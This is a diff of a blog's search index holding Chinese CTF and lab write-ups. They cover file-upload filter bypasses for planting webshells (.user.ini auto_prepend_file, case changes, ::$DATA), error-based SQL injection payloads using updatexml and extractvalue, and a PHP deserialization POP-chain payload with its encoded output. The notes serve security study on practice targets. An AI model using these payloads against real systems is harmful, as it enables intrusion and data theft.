-<p>我们可以用修改配置文件来上传，.user.ini实际上就是可以用户自定义的php.ini,不过只能自定义除了PHP_INI_SYSTEM之外的模式具体可以看官网（<a href="https://www.php.net/manual/zh/ini.list.php">PHP: php.ini 配置选项列表 - Manual</a>）</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这里我们利用PHP_INI_PERDIR中的auto_prepend_file和auto_append_file,前者是在加载第一个PHP代码之前先预加载该配置所指示的php文件，后者则是之后。这样就能让所有php文件自动包含某个文件，前提是上传的目录下要有一个正常的php文件。</p>
-<p>我们首先上传一个.user.ini的文件，里面的设置为auto_prepend_file&#x3D;muma.png。这里的muma.png里即是我们的一句话木马。我们之后再把muma.png上传，便使得一句话木马能被成功利用。</p>
-<h1 id="pass6（大小写）"><a href="#pass6（大小写）" class="headerlink" title="pass6（大小写）"></a>pass6（大小写）</h1><p>本题没有对大小写进行检查，直接改为.PHp就能上传成功。</p>
-<p>要注意的是，上传的时候文件名给改了，我们可以在这查看改后的文件名</p>
-<p><img src="/../images/c2fo6hak5a22e_a3bf6c5be61f466ca27559897b985bc4.webp" alt="c2fo6hak5a22e_a3bf6c5be61f466ca27559897b985bc4" loading="lazy"></p>
-<p><img src="/../images/1740121002657(1).jpg" alt="1740121002657(1)" loading="lazy"></p>
-<p>之后便能用蚁剑进行连接。</p>
-<h1 id="pass7（空格绕过）"><a href="#pass7（空格绕过）" class="headerlink" title="pass7（空格绕过）"></a>pass7（空格绕过）</h1><p>由于源码中没有删除空格的代码，所以我们可以在后缀名的最后加上一个空格来绕过检查。（网上大都是这样的，不过我暂时没复现成功会上传出错，查资料说是php版本问题，要低于5.3.29，可是修改过后还是不行，之后再试试）</p>
-<h1 id="pass8（-绕过）"><a href="#pass8（-绕过）" class="headerlink" title="pass8（.绕过）"></a>pass8（.绕过）</h1><p>由于源码中没有删除.的代码，所以我们直接在文件名最后加上一个.来绕过检测这个也要注意php版本问题。</p>
-<h1 id="pass9-DATA绕过"><a href="#pass9-DATA绕过" class="headerlink" title="pass9(::$DATA绕过)"></a>pass9(::$DATA绕过)</h1><h2 id="额外数据流"><a href="#额外数据流" class="headerlink" title="额外数据流"></a>额外数据流</h2><p>一般情况下我们打开一个文件看到的是一个文件的默认数据流，但是windows支持在文件内部创建额外的数据流以保存其他信息，这些额外数据流可以通过在文件名后加上**::$DATA**来访问，例如查看1.txt的额外数据流我们可以访问1.txt::$DATA。</p>
-<p>但是windows的文件是不能出现：等特殊字符的，如果有系统会直接去掉，我们正好可以利用这个特性。</p>
-<p>我们首先在上传一个木马并且用bp抓包，在bp中在文件名后面加上**::$DATA**,上传到靶机（windows）后，::$DATA被删除，我们便能用蚁剑直接进行连接。</p>
-<h1 id="pass10-绕过"><a href="#pass10-绕过" class="headerlink" title="pass10(. .绕过)"></a>pass10(. .绕过)</h1><p>源码和第五关类似，由源码可知对文件名先删了个点再首尾去空，我们只要将文件名设置为.php. .,那么删完末尾还有个点，检测后缀名时会出错，与黑名单配对不上，故能绕过。</p>
+    <title>报错注入</title>
+    <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less7</p>
+<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p><strong>updatexml‌函数的基本语法：</strong><br>updatexml(xml_document, XPath_string, new_value)</p>
+<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
+<h5 id="XPath语法基础"><a href="#XPath语法基础" class="headerlink" title="XPath语法基础"></a>XPath语法基础</h5><p>XPath是一种在XML文档中查找信息的语言，使用路径表达式来选取节点。XPath支持多种节点类型，包括元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XPath语法使用<strong>关系运算符（如&#x2F;和&#x2F;&#x2F;）</strong>来连接步骤，描述节点的位置关系‌</p>
+<p><strong>正确使用时：</strong></p>
+<p><code>updatexml(&#39;&lt;h1&gt;hello&lt;/h1&gt;&#39;,&#39;/h1&#39;,&#39;x&#39;)</code></p>
+<p>这个语法的作用是将hello换成了x。</p>
+<p><strong>报错时的使用：</strong></p>
+<p>我们可以通过修改XPath的语句进而构成语法错误。</p>
+<p>例如：<code>updatexml(&#39;hello&#39;,concat(&#39;--&#39;,(select version()),&#39;--&#39;),&#39;x&#39;)</code></p>
+<p>这样就会爆出类似<code>XPATH syntax error : &#39;--5.7.26--&#39;</code>的语句。</p>
+<h1 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h1><p><strong>extractvalue‌函数的基本语法</strong><br><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
+<p><strong>例如</strong></p>
+<p><code>extractvalue(1,concat(0x7e,(select database())))</code></p>
+<p>便会返回数据库名称。</p>
 ]]></content>
       <tags>
-        <tag>upload-labs</tag>
+        <tag>sqlilab注入 web</tag>
       </tags>
   </entry>
   <entry>
@@ -642,61 +671,6 @@
       </tags>
   </entry>
   <entry>
-    <title>报错注入</title>
-    <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less7</p>
-<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p><strong>updatexml‌函数的基本语法：</strong><br>updatexml(xml_document, XPath_string, new_value)</p>
-<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
-<h5 id="XPath语法基础"><a href="#XPath语法基础" class="headerlink" title="XPath语法基础"></a>XPath语法基础</h5><p>XPath是一种在XML文档中查找信息的语言，使用路径表达式来选取节点。XPath支持多种节点类型，包括元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XPath语法使用<strong>关系运算符（如&#x2F;和&#x2F;&#x2F;）</strong>来连接步骤，描述节点的位置关系‌</p>
-<p><strong>正确使用时：</strong></p>
-<p><code>updatexml(&#39;&lt;h1&gt;hello&lt;/h1&gt;&#39;,&#39;/h1&#39;,&#39;x&#39;)</code></p>
-<p>这个语法的作用是将hello换成了x。</p>
-<p><strong>报错时的使用：</strong></p>
-<p>我们可以通过修改XPath的语句进而构成语法错误。</p>
-<p>例如：<code>updatexml(&#39;hello&#39;,concat(&#39;--&#39;,(select version()),&#39;--&#39;),&#39;x&#39;)</code></p>
-<p>这样就会爆出类似<code>XPATH syntax error : &#39;--5.7.26--&#39;</code>的语句。</p>
-<h1 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h1><p><strong>extractvalue‌函数的基本语法</strong><br><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
-<p><strong>例如</strong></p>
-<p><code>extractvalue(1,concat(0x7e,(select database())))</code></p>
-<p>便会返回数据库名称。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界</title>
-    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
-    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
-<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
-<p>举例：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>PHP反序列化标识符含义：</p>
-<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
-
-<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
-<p><strong>原理：</strong></p>
-<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
-<p>以下是漏洞中可能遇到的魔法方法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
-
-<p><em>例题</em></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>构造payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-
-<p><strong>绕过：</strong></p>
-<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
-      <tags>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>笛卡尔积延时注入</title>
     <url>/2025/01/21/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h1><p>如果一个网站存在基于时间的盲注，而恰好sleep这类核心函数被过滤的话，我们便可以使用。</p>
@@ -742,15 +716,41 @@
       </tags>
   </entry>
   <entry>
+    <title>攻防世界</title>
+    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
+<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
+<p>举例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP反序列化标识符含义：</p>
+<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
+<p><strong>原理：</strong></p>
+<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
+<p>以下是漏洞中可能遇到的魔法方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
+
+<p><em>例题</em></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过：</strong></p>
+<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
+      <tags>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>虚拟机的搭建</title>
     <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>博客的创建</title>
-    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
-    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
 ]]></content>
   </entry>
 </search>
